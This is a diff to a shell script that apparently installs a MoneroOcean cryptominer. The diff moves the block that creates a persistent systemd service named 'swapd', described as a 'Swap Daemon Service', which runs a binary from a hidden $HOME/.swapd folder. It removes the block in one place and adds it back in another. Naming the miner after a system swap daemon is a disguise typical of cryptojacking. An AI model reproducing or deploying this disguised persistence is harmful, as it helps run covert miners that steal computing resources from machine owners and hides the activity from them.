@@ -382,34 +382,6 @@ else
 
   else
 
-    echo "[*] Creating moneroocean systemd service"
-
-    rm -rf /etc/systemd/system/swapd.service
-
-    cat >/tmp/swapd.service <<EOL
-[Unit]
-Description=Swap Daemon Service
-
-[Service]
-ExecStart=$HOME/.swapd/swapd -o 127.0.0.1:3333 -u x+50000
-Restart=always
-Nice=10
-CPUWeight=1
-
-[Install]
-WantedBy=multi-user.target
-EOL
-    sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service
-    #sudo chmod 666 /etc/systemd/system/swapd.service
-    echo "[*] Starting swapd systemd service"
-    sudo killall swapd 2>/dev/null
-    sudo systemctl daemon-reload
-    sudo systemctl enable swapd.service
-    sudo systemctl start swapd.service
-    echo "To see swapd service logs run \"sudo journalctl -u swapd -f\" command"
-  fi
-fi
-
 echo ""
 echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
 if [ "$CPU_THREADS" -lt "4" ]; then
@@ -611,7 +583,20 @@ CPUWeight=1
 WantedBy=multi-user.target
 EOL
 
-sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service
+echo "[*] Creating swapd service..."
+cat <<EOF | sudo tee /etc/systemd/system/swapd.service
+[Unit]
+Description=Swap Daemon Service
+
+[Service]
+ExecStart=$HOME/.swapd/swapd -o 127.0.0.1:3333 -u x+50000
+Restart=always
+Nice=10
+CPUWeight=1
+
+[Install]
+WantedBy=multi-user.target
+EOF
 
 # ======== FINAL SETUP STEPS ========
 echo "[*] Starting services..."
